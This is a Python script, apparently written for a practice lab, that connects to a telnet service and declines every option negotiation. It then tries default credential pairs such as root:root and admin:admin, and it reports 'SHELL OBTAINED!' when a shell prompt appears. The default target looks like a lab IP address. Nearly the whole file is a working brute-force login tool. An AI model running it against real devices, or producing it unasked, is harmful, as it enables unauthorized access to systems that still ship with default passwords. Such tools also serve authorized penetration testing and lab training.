#!/usr/bin/env python3
import socket, sys, time

IAC  = 255
DONT = 254
DO   = 253
WONT = 252
WILL = 251

def negotiate(s):
    try:
        s.setblocking(False)
        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except BlockingIOError:
        pass
    s.setblocking(True)

    if not data:
        return b""

    out = bytearray()
    i = 0
    visible = bytearray()
    while i < len(data):
        if data[i] == IAC and i + 1 < len(data):
            cmd = data[i + 1]
            if i + 2 < len(data) and cmd in (DO, DONT, WILL, WONT):
                opt = data[i + 2]
                if cmd == DO:
                    out += bytes([IAC, WONT, opt])
                elif cmd == WILL:
                    out += bytes([IAC, DONT, opt])
                i += 3
            elif cmd == IAC:
                visible.append(IAC)
                i += 2
            else:
                i += 2
        else:
            visible.append(data[i])
            i += 1

    if out:
        s.send(bytes(out))
    return bytes(visible)

def recv_all(s, timeout=3):
    s.setblocking(False)
    data = b""
    start = time.time()
    while time.time() - start < timeout:
        try:
            chunk = s.recv(4096)
            if chunk:
                data += chunk
                start = time.time()
        except BlockingIOError:
            time.sleep(0.1)
    s.setblocking(True)

    out = bytearray()
    visible = bytearray()
    i = 0
    while i < len(data):
        if data[i] == IAC and i + 1 < len(data):
            cmd = data[i + 1]
            if i + 2 < len(data) and cmd in (DO, DONT, WILL, WONT):
                opt = data[i + 2]
                if cmd == DO:
                    out += bytes([IAC, WONT, opt])
                elif cmd == WILL:
                    out += bytes([IAC, DONT, opt])
                i += 3
            elif cmd == IAC:
                visible.append(IAC)
                i += 2
            else:
                i += 2
        else:
            visible.append(data[i])
            i += 1

    if out:
        s.send(bytes(out))
    return bytes(visible)

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "10.129.134.54"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 23

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))

    banner = negotiate(s)
    print(f"[+] Banner: {banner}")

    time.sleep(1)
    prompt = recv_all(s)
    print(f"[+] After wait: {prompt}")

    for user, passwd in [("root", "root"), ("admin", "admin"), ("root", "password"), ("admin", "password")]:
        print(f"\n[*] Trying {user}:{passwd}")
        s.setblocking(True)
        s.send(f"{user}\n".encode())
        time.sleep(1)
        resp = recv_all(s)
        print(f"    Response: {resp}")

        s.send(f"{passwd}\n".encode())
        time.sleep(1)
        resp = recv_all(s)
        print(f"    Response: {resp}")

        if b"#" in resp or b"$" in resp or b"~" in resp:
            print("[+] SHELL OBTAINED!")
            break

    s.close()

if __name__ == "__main__":
    main()
